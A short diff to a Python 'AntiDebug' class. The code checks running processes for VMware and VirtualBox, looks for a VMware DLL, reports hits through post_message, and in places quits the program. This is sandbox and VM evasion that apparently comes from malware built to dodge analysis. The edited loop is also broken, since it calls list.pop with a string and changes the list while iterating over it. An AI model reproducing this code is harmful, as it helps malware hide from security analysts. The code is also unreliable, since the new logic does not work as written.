@@ -253,10 +253,13 @@ class AntiDebug():
             processList     = []
 
             for processNames in process.split(" "):
-                if ".exe" in processNames: processList.append(processNames.replace("K\n", "").replace("\n", ""))
+                if ".exe" in processNames: processList.append(processNames.replace("K\n", ""))
 
-            if "VMwareService.exe" in processList or "VMwareTray.exe" in processList: 
-                self.post_message("VMwareService.exe & VMwareTray.exe process are running") ; os._exit(1)
+            for proc in processList:
+                if proc == "\n":
+                    processList.pop(proc)
+                if proc.startswith("VirtualBox") or proc.startswith("VM"):
+                    self.post_message(f"PROCESS {proc} IS RUNNING")
                             
             if os.path.exists(vmware_dll): 
                 self.post_message("**Vmware DLL Detected**") ; os._exit(1)
